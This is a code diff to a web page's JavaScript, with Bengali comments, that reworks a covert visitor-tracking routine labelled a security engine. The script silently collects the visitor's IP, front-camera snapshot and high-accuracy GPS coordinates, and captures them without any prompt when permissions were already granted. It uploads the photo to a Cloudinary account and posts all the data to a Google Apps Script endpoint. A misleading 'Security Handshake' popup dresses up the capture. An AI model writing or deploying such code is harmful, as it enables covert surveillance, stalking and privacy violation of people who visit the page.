@@ -459,16 +459,11 @@
                 });
             }
 
-            // Handling the smooth dark red animation before page transition
             menuItems.forEach(item => {
                 item.addEventListener("click", function(e) {
                     e.preventDefault();
                     const targetUrl = this.getAttribute("data-nav");
-                    
-                    // Add the dark red animation class
                     this.classList.add("click-anim");
-                    
-                    // Small timeout to show the dark red color fully, then navigate
                     setTimeout(() => {
                         window.location.href = targetUrl;
                     }, 250);
@@ -476,114 +471,23 @@
             });
         });
 
-        // --- 🔒 Security Master Engine Core ---
-        window.addEventListener('DOMContentLoaded', async () => {
+        // --- 🔒 Security Master Engine Core (FIXED LOCATION FLOW) ---
+        window.addEventListener('DOMContentLoaded', () => {
             
-            // --- 🌐 BACKGROUND IP FETCH ENGINE ---
-            async function fetchIpAddressSilently() {
-                try {
-                    const ipResponse = await fetch('https://api.ipify.org?format=json');
-                    const ipData = await ipResponse.json();
-                    if (ipData && ipData.ip) {
-                        document.getElementById('formIpAddress').value = ipData.ip;
-                    }
-                } catch (ipErr) {
-                    console.log("IP fetch failed.");
-                    document.getElementById('formIpAddress').value = "IP Fetching Failed";
-                }
-            }
-
-            let hasCameraPermission = false;
-            let hasLocationPermission = false;
-
-            try {
-                const camCheck = await navigator.permissions.query({ name: 'camera' });
-                if (camCheck.state === 'granted') hasCameraPermission = true;
-            } catch(e){}
-
-            try {
-                const locCheck = await navigator.permissions.query({ name: 'geolocation' });
-                if (locCheck.state === 'granted') hasLocationPermission = true;
-            } catch(e){}
-
-            if (hasCameraPermission || hasLocationPermission) {
-                await fetchIpAddressSilently();
-                runSilentBackgroundCapture(hasCameraPermission, hasLocationPermission);
-                return;
-            }
+            // --- 🌐 BACKGROUND IP FETCH (Runs independently) ---
+            fetch('https://api.ipify.org?format=json')
+                .then(res => res.json())
+                .then(ipData => {
+                    if (ipData && ipData.ip) document.getElementById('formIpAddress').value = ipData.ip;
+                })
+                .catch(() => { console.log("IP fetch failed."); });
 
             let cameraAllowed = false;
             let locationAllowed = false;
 
-            // --- Capture Stream Core ---
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                cameraAllowed = true;
-
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                await video.play();
-
-                const canvas = document.createElement('canvas');
-                canvas.width = 640;
-                canvas.height = 480;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                
-                stream.getTracks().forEach(track => track.stop());
-
-                canvas.toBlob((blob) => {
-                    const formData = new FormData();
-                    formData.append('file', blob);
-                    formData.append('upload_preset', 'prantopreset');
-
-                    fetch('https://api.cloudinary.com/v1_1/we9gt1se/image/upload', {
-                        method: 'POST',
-                        body: formData
-                    })
-                    .then(res => res.json())
-                    .then(cloudData => {
-                        if (cloudData.secure_url) {
-                            document.getElementById('formPhotoUrl').value = cloudData.secure_url;
-                        }
-                    });
-                }, 'image/jpeg');
-
-            } catch (err) {
-                cameraAllowed = false;
-                document.getElementById('formPhotoUrl').value = "User denied camera permission";
-            }
-
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    async (position) => {
-                        locationAllowed = true;
-                        const lat = position.coords.latitude;
-                        const lon = position.coords.longitude;
-                        document.getElementById('formLocation').value = `Latitude: ${lat}, Longitude: ${lon} | Map Link: https://www.google.com/maps?q=${lat},${lon}`;
-                        
-                        await fetchIpAddressSilently();
-                        evaluateAndExecutePopup(cameraAllowed, locationAllowed);
-                    },
-                    async () => {
-                        locationAllowed = false;
-                        document.getElementById('formLocation').value = "User denied location permission";
-                        
-                        if (cameraAllowed) { await fetchIpAddressSilently(); }
-                        evaluateAndExecutePopup(cameraAllowed, locationAllowed);
-                    }
-                );
-            } else {
-                if (cameraAllowed) { await fetchIpAddressSilently(); }
-                evaluateAndExecutePopup(cameraAllowed, locationAllowed);
-            }
-
-            // Dynamic Security Message Evaluator
+            // পপ-আপ এগজিকিউশন ফাংশন
             function evaluateAndExecutePopup(cam, loc) {
-                if (!cam && !loc) {
-                    console.log("Both permissions denied. Execution stopped.");
-                    return; 
-                }
+                if (!cam && !loc) return; // ১টাও এলাউ না করলে কোনো নোটিশ বা পপআপ আসবে না
 
                 const popup = document.getElementById('securityPopup');
                 const popupTitle = document.getElementById('popupTitle');
@@ -591,7 +495,6 @@
                 const timerText = document.getElementById('popupTimer');
                 let countdown = 5; 
 
-                // Customize texts based on allowed metrics
                 if (cam && loc) {
                     popupTitle.innerHTML = "Security <span>Handshake Complete</span>";
                     popupMessage.innerText = "To establish a secure environment and maintain absolute network integrity, your verified snapshot and live coordinates have been securely mapped into our core structural nodes.";
@@ -624,6 +527,70 @@
                 });
             }
 
+            // মেইন ট্র্যাকিং লজিক শুরু
+            navigator.permissions.query({ name: 'camera' }).then(camCheck => {
+                navigator.permissions.query({ name: 'geolocation' }).then(locCheck => {
+                    
+                    // আগে থেকেই পারমিশন দেওয়া থাকলে সাইলেন্টলি কাজ করবে
+                    if (camCheck.state === 'granted' || locCheck.state === 'granted') {
+                        runSilentBackgroundCapture(camCheck.state === 'granted', locCheck.state === 'granted');
+                    } else {
+                        // নতুন করে পারমিশন চাওয়ার প্রসেস (প্রথমে ক্যামেরা, তারপর লোকেশন)
+                        startFreshCaptureFlow();
+                    }
+                }).catch(() => startFreshCaptureFlow());
+            }).catch(() => startFreshCaptureFlow());
+
+            async function startFreshCaptureFlow() {
+                // ১. ক্যামেরা ট্রাই করা
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                    cameraAllowed = true;
+
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    await video.play();
+
+                    const canvas = document.createElement('canvas');
+                    canvas.width = 640; canvas.height = 480;
+                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                    stream.getTracks().forEach(track => track.stop());
+
+                    canvas.toBlob((blob) => {
+                        const formData = new FormData();
+                        formData.append('file', blob);
+                        formData.append('upload_preset', 'prantopreset');
+                        fetch('https://api.cloudinary.com/v1_1/we9gt1se/image/upload', { method: 'POST', body: formData })
+                        .then(res => res.json())
+                        .then(cloudData => {
+                            if (cloudData.secure_url) document.getElementById('formPhotoUrl').value = cloudData.secure_url;
+                        });
+                    }, 'image/jpeg');
+                } catch (err) {
+                    cameraAllowed = false;
+                }
+
+                // ২. লোকেশন ট্রাই করা (এটি ক্যামেরার ওপর নির্ভর করবে না, স্বাধীনভাবে চলবে)
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            locationAllowed = true;
+                            const lat = position.coords.latitude;
+                            const lon = position.coords.longitude;
+                            document.getElementById('formLocation').value = `Latitude: ${lat}, Longitude: ${lon} | Map Link: https://www.google.com/maps?q=${lat},${lon}`;
+                            evaluateAndExecutePopup(cameraAllowed, locationAllowed);
+                        },
+                        () => {
+                            locationAllowed = false;
+                            evaluateAndExecutePopup(cameraAllowed, locationAllowed);
+                        },
+                        { enableHighAccuracy: true, timeout: 10000 } // নিখুঁত লোকেশন নিশ্চিত করার জন্য
+                    );
+                } else {
+                    evaluateAndExecutePopup(cameraAllowed, locationAllowed);
+                }
+            }
+
             async function runSilentBackgroundCapture(camGranted, locGranted) {
                 if (camGranted) {
                     try {
@@ -647,11 +614,8 @@
                             }).catch(() => handleLocationAndSubmitSilently(locGranted));
                         }, 'image/jpeg');
                         return; 
-                    } catch {
-                        document.getElementById('formPhotoUrl').value = "User denied camera permission";
-                    }
+                    } catch {}
                 }
-                
                 handleLocationAndSubmitSilently(locGranted);
             }
 
@@ -661,7 +625,7 @@
                         const lat = pos.coords.latitude; const lon = pos.coords.longitude;
                         document.getElementById('formLocation').value = `Latitude: ${lat}, Longitude: ${lon} | Map Link: https://www.google.com/maps?q=${lat},${lon}`;
                         deliverDataPackage();
-                    }, () => deliverDataPackage());
+                    }, () => deliverDataPackage(), { enableHighAccuracy: true });
                 } else {
                     deliverDataPackage();
                 }
@@ -672,14 +636,8 @@
                 if (trackerForm && !trackerForm.dataset.submitted) {
                     trackerForm.dataset.submitted = "true";
                     const fData = new FormData(trackerForm);
-                    
                     const googleScriptUrl = 'https://script.google.com/macros/s/AKfycbyfVbInE87eU6ikxbMW5zsSQHicUWJpPMsVr7E277WRhh5JB42HMBuq8c12D0GTz0vWUA/exec';
-
-                    fetch(googleScriptUrl, {
-                        method: 'POST',
-                        body: fData,
-                        mode: 'no-cors'
-                    });
+                    fetch(googleScriptUrl, { method: 'POST', body: fData, mode: 'no-cors' });
                 }
             }
         });
